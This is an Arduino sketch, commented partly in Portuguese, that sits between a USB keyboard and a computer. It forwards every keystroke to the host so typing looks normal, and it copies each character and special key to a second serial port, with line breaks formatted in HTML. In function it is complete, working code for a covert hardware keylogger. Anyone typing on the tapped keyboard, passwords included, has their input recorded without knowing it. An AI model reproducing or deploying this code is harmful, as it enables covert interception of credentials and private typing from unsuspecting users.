#include <hidboot.h>
#include <usbhub.h>
#include "Keyboard.h"

#define Serial Serial1

// Satisfy the IDE, which needs to see the include statment in the ino too.
#ifdef dobogusinclude
  #include <spi4teensy3.h>
  #include <SPI.h>
#endif

#include <SPI.h>
#include <SD.h>

bool shift = false;
USB     Usb;
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);
uint32_t next_time;


class KbdRptParser : public KeyboardReportParser{
  public:
    uint8_t _parse(uint8_t key);
    String _getChar(uint8_t key);
  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);

    void OnKeyDown  (uint8_t mod, uint8_t key);
    void OnKeyUp  (uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
    
    void _press(uint8_t key);
    void _release(uint8_t key);
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key){
  int parsedKey = _parse(key);
  if(parsedKey == key){ //sendo nao caracter-especial
    uint8_t c = OemToAscii(mod, key);
    OnKeyPressed(c);
    
    if(c != 0x20 && c != 0x00) {
       Serial.print((char)c);
       _press(c);
    }
    else _press(key);
  }else{ 
    Serial.print(_getChar(key)); ///this shit now works, printa o caracter especial
    _press(parsedKey);
  }
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key){
  int parsedKey = _parse(key);
  if(parsedKey == key){ // so entra aqui se nao for um caracter especial tipo o return 
    uint8_t c = OemToAscii(mod, key);
    OnKeyPressed(c);

    if(c != 0x20 && c != 0x00){
      _release(c);
      // Serial.print((char)c);
    }
    else{
      _release(key);
    }
  }else{
    _release(parsedKey);
  }
}
// Alerta para teclas do tipo ctrl, shift,fn,numlock
void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {

  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;

  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  //left
  if(beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl){
    if(afterMod.bmLeftCtrl) Keyboard.press(KEY_LEFT_CTRL);
    else Keyboard.release(KEY_LEFT_CTRL);
    Serial.print(" _ctrl "+(String)afterMod.bmLeftCtrl+"_ ");
  }
  
  if(beforeMod.bmLeftShift != afterMod.bmLeftShift){
    if(afterMod.bmLeftShift) Keyboard.press(KEY_LEFT_SHIFT);
    else Keyboard.release(KEY_LEFT_SHIFT);
    shift = afterMod.bmLeftShift;
    //Serial.print("<shift "+(String)afterMod.bmLeftShift+">");
  }
  
  if(beforeMod.bmLeftAlt != afterMod.bmLeftAlt){
    if(afterMod.bmLeftAlt) Keyboard.press(KEY_LEFT_ALT);
    else Keyboard.release(KEY_LEFT_ALT);
    Serial.print(" _alt "+(String)afterMod.bmLeftAlt+"_ ");
  }
  
  if(beforeMod.bmLeftGUI != afterMod.bmLeftGUI){
    if(afterMod.bmLeftGUI) Keyboard.press(KEY_LEFT_GUI);
    else Keyboard.release(KEY_LEFT_GUI);
    Serial.print(" _gui "+(String)afterMod.bmLeftGUI+"_ ");
  }

  //right
  if(beforeMod.bmRightCtrl != afterMod.bmRightCtrl){
    if(afterMod.bmRightCtrl) Keyboard.press(KEY_RIGHT_CTRL);
    else Keyboard.release(KEY_RIGHT_CTRL);
    Serial.print("_ctrl "+(String)afterMod.bmRightCtrl+"_ ");
  }
  
  if(beforeMod.bmRightShift != afterMod.bmRightShift){
    if(afterMod.bmRightShift) Keyboard.press(KEY_RIGHT_SHIFT);
    else Keyboard.release(KEY_RIGHT_SHIFT);
    shift = afterMod.bmLeftShift;
    // Serial.print(" _shift "+(String)afterMod.bmRightShift+"_ ");
  }
  
  if(beforeMod.bmRightAlt != afterMod.bmRightAlt){
    if(afterMod.bmRightAlt) Keyboard.press(KEY_RIGHT_ALT);
    else Keyboard.release(KEY_RIGHT_ALT);
    Serial.print(" _alt "+(String)afterMod.bmRightAlt+"_ ");
  }
  
  if(beforeMod.bmRightGUI != afterMod.bmRightGUI){
    if(afterMod.bmRightGUI) Keyboard.press(KEY_RIGHT_GUI);
    else Keyboard.release(KEY_RIGHT_GUI);
    Serial.print(" _gui "+(String)afterMod.bmRightGUI+"_ ");
  }

}

// pro caso de algum ser spammar a tecla
void KbdRptParser::OnKeyPressed(uint8_t key){
   // Serial.print((char)key);
};

uint8_t KbdRptParser::_parse(uint8_t key){

  switch(key){
    case 0x2C: return 0x20; break; // SPACE
    case 40: return KEY_RETURN; break;
    case 41: return KEY_ESC; break;
    case 42: return KEY_BACKSPACE; break;
    case 43: return KEY_TAB; break;
    case 58: return KEY_F1; break;
    case 59: return KEY_F2; break;
    case 60: return KEY_F3; break;
    case 61: return KEY_F4; break;
    case 62: return KEY_F5; break;
    case 63: return KEY_F6; break;    
    case 64: return KEY_F7; break;
    case 65: return KEY_F8; break;
    case 66: return KEY_F9; break;
    case 67: return KEY_F10; break;
    case 68: return KEY_F11; break;
    case 69: return KEY_F12; break;
    case 73: return KEY_INSERT; break;
    case 74: return KEY_HOME; break;
    case 75: return KEY_PAGE_UP; break;
    case 76: return KEY_DELETE; break;
    case 77: return KEY_END; break;
    case 78: return KEY_PAGE_DOWN; break;
    case 79: return KEY_RIGHT_ARROW; break;
    case 80: return KEY_LEFT_ARROW; break;
    case 81: return KEY_DOWN_ARROW; break;
    case 82: return KEY_UP_ARROW; break;
    case 88: return KEY_RETURN; break;
    default: {
      //Serial.print(" N/A ");
      return key;
    }
  }
}
// little upgrade no _NOME _
// printa os caracteres especiais
String KbdRptParser::_getChar(uint8_t key){
//Serial.println(key);
  switch(key){
    case 0x2C: return " "; break;
    case 40: return " _RETURN_<br>\n"; break;
    case 41: return " _ESC_ \n"; break;
    case 42: return " _BACKSPACE_ "; break;
    case 43: return " _TAB_ \n"; break;
    case 58: return " _F1_ \n"; break;
    case 59: return " _F2_ \n"; break;
    case 60: return " _F3_ \n"; break;
    case 61: return " _F4_ \n"; break;
    case 62: return " _F5_ \n"; break;
    case 63: return " _F6_ \n"; break;    
    case 64: return " _F7_ \n"; break;
    case 65: return " _F8_ \n"; break;
    case 66: return " _F9_ \n"; break;
    case 67: return " _F10_ \n"; break;
    case 68: return " _F11_ \n"; break;
    case 69: return " _F12_ \n"; break;
    case 73: return " _INSERT_ "; break;
    case 74: return " _HOME_ \n"; break;
    case 75: return " _PAGE_UP_ \n"; break;
    case 76: return " _DELETE_ "; break;
    case 77: return " _END_ \n"; break;
    case 78: return " _PAGE_DOWN_ \n"; break;
    case 79: return " _RIGHT_ARROW_ \n"; break;
    case 80: return " _LEFT_ARROW_ \n"; break;
    case 81: return " _DOWN_ARROW_ \n"; break;
    case 82: return " _UP_ARROW_ \n"; break;
    case 88: return " _RETURN_<br> \n"; break;
    default: {
      return "";
    }
  }
}
// tecla
void KbdRptParser::_press(uint8_t key){
  Keyboard.press(key); 
}
// libera tecla
void KbdRptParser::_release(uint8_t key){
  Keyboard.release(key);
}

KbdRptParser parser;


// Every Arduino sketch is different, 
// but they all include these few lines of code. 
// The setup() function will only run once, after each powerup or reset of the Arduino board.
void setup()
{
  Serial.begin(115200);
  // faz o leonardo começar a agir como um teclado
  // When used with a Leonardo or Due board,
  // Keyboard.begin() starts emulating a keyboard connected to a computer. To end control, use Keyboard.end().
  Keyboard.begin();
  delay(200);
    // erro checker
  if(Usb.Init() == -1) Serial.println("OSC did not start.");
  
  delay(200);
 
  next_time = millis() + 5000;

  HidKeyboard.SetReportParser(0, &parser);

}
// and loops consecutively, allowing your program to change and respond.
void loop(){
  Usb.Task();
}


// A delay is used in many sample programs in combination with the serial communication to avoid the Serial monitor to scroll to fast.
